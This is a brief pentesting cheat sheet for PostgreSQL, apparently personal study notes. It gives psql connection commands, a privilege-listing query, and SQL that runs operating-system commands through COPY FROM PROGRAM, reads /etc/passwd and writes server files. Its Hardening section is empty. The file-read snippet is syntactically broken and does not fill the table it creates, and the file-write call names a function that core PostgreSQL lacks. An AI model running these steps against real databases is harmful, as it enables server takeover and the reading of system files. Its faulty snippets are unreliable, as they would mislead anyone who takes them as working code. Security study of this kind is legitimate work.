**Tags:** #type/tech-specific

---
# Fundamentals
## Manual connection
The tool `psql`can be used.
connect to database: `psql -h 192.168.x.x -p 5432 -U user -d database`
list databases: `psql -h 192.168.x.x -p 5432 -U user -l`
In the psql session:
show roles of current user: `\du`
list privileges on tables: `\dp`
show databases: `\l`
# Pentesting

### List permissions
To list the actual users permissions:
```sql
SELECT   
      r.rolname,   
      r.rolsuper,   
      r.rolinherit,  
      r.rolcreaterole,  
      r.rolcreatedb,  
      r.rolcanlogin,  
      r.rolconnlimit, r.rolvaliduntil,  
  ARRAY(SELECT b.rolname  
        FROM pg_catalog.pg_auth_members m  
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)  
        WHERE m.member = r.oid) as memberof  
, r.rolreplication  
FROM pg_catalog.pg_roles r  
ORDER BY 1;
```

### Command execution
Required privileges:
- `pg_execute_server_program` - allow executing commands directly into the operating system.

Use the postgresql specific `COPY` clause to execute  system commands
```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;
```
### File access
Required privileges
- `pg_read_server_files` - allows reading files
- `pg_write_server_files` - allows writing to files

Use the `COPY` statement:

```sql
CREATE TABLE read_files(output text);
COPY pg_read_file('/etc/passwd');
SELECT * FROM read_files;
```

to write files use :
`SELECT pg_write_file('/var/test.txt','testcontent');`
# Hardening
